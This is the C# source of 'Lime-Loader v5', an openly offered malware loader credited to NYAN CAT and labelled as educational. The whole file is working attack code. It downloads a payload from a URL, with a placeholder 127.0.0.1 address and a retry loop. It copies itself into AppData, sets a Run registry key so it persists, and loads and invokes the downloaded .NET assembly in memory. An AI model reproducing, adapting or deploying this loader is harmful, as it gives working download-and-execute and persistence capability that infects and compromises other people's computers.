﻿using System;
using System.IO;
using System.Net;
using System.Diagnostics;
using System.Reflection;
using System.Threading;
using Microsoft.Win32;


//       │ Author     : NYAN CAT
//       │ Name       : Lime-Loader v5
//       │ Contact    : https://github.com/NYAN-x-CAT

//       This program is distributed for educational purposes only.


namespace Lime_Loader
{
    class Program
    {


       public static void Main()
        {

        redownload:
            byte[] payloadBuffer = DownloadPayload(@"http://127.0.0.1/malware.exe");

            if (payloadBuffer == null)
            {
                Thread.Sleep(10 * 1000);
                goto redownload;
            }

            if (InstallPayload(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\payload.exe"))
                Environment.Exit(0);
            else
                RunPayload(payloadBuffer);
        }


        private static bool InstallPayload(string dropPath)
        {
            if (!Process.GetCurrentProcess().MainModule.FileName.Equals(dropPath, StringComparison.CurrentCultureIgnoreCase))
            {
                FileStream FS = null;
                try
                {
                    if (!File.Exists(dropPath))
                        FS = new FileStream(dropPath, FileMode.CreateNew);
                    else
                        FS = new FileStream(dropPath, FileMode.Create);
                    byte[] loaderBuffer = File.ReadAllBytes(Process.GetCurrentProcess().MainModule.FileName);
                    FS.Write(loaderBuffer, 0, loaderBuffer.Length);
                    FS.Dispose();
                    Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run\").SetValue(Path.GetFileName(dropPath), dropPath);
                    Process.Start(dropPath);
                    return true;
                }
                catch
                {
                    return false;
                }
            }
            return false;
        }


        private static byte[] DownloadPayload(string url)
        {
            using (WebClient wc = new WebClient())
            {
                try
                {
                    return wc.DownloadData(url);
                }
                catch
                {
                    return null;
                }
            }
        }


        private static void RunPayload(byte[] payload)
        {
            new Thread(() =>
            {
                try
                {
                    Assembly asm = AppDomain.CurrentDomain.Load(payload);
                    MethodInfo Metinf = asm.EntryPoint;
                    object InjObj = asm.CreateInstance(Metinf.Name);
                    object[] parameters = new object[1];  // C#
                    if (Metinf.GetParameters().Length == 0)
                    {
                        parameters = null; // VB.NET
                    }
                    Metinf.Invoke(InjObj, parameters);
                }
                catch { }
            })
            { IsBackground = false }.Start();
        }


    }
}
